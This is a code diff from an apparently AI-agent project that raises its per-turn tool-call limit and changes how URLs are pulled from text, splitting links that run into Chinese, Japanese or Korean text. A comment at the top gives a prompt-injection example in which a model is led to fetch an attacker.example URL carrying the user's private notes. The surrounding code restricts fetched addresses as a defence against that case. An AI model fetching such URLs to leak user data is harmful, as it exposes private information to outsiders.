@@ -3,11 +3,11 @@
 // https://attacker.example/?data=<private notes>, and that's a public address.
 
 import type { Message, ToolName } from "@homestorm/shared";
-import { TOOL_NAMES } from "@homestorm/shared";
+import { cutAtCjkPunctuation, TOOL_NAMES } from "@homestorm/shared";
 import type { ToolCall } from "../services/llmgw.js";
 
 /** How many tool calls one turn gets. Then the seat answers from what it has. */
-export const MAX_TOOL_CALLS_PER_TURN = 4;
+export const MAX_TOOL_CALLS_PER_TURN = 6;
 
 /** How much of one call's result goes into the forced final answer. */
 const RESEARCH_CHARS_PER_CALL = 16_000;
@@ -47,9 +47,19 @@ function trimLink(raw: string): string {
   return link;
 }
 
+/** Chinese, Japanese or Korean letters, which may be part of a link or the sentence straight after it. */
+const CJK_LETTERS = /[\u3040-\u30ff\u3400-\u9fff\uac00-\ud7af]/;
+
 export function urlsIn(text: string): string[] {
   return (text.match(URL_IN_TEXT) ?? [])
-    .map((m) => canonicalUrl(trimLink(m)))
+    .flatMap((m) => {
+      const link = trimLink(cutAtCjkPunctuation(m));
+      // "请读取https://a.example/x并总结": there's no telling where the link ends, so both count. Only the Chair's words
+      // and the brief are read this way, so this can't add an address a web page chose.
+      const at = link.search(CJK_LETTERS);
+      return at === -1 ? [link] : [link, trimLink(link.slice(0, at))];
+    })
+    .map((link) => canonicalUrl(link))
     .filter((u): u is string => u !== null);
 }
 
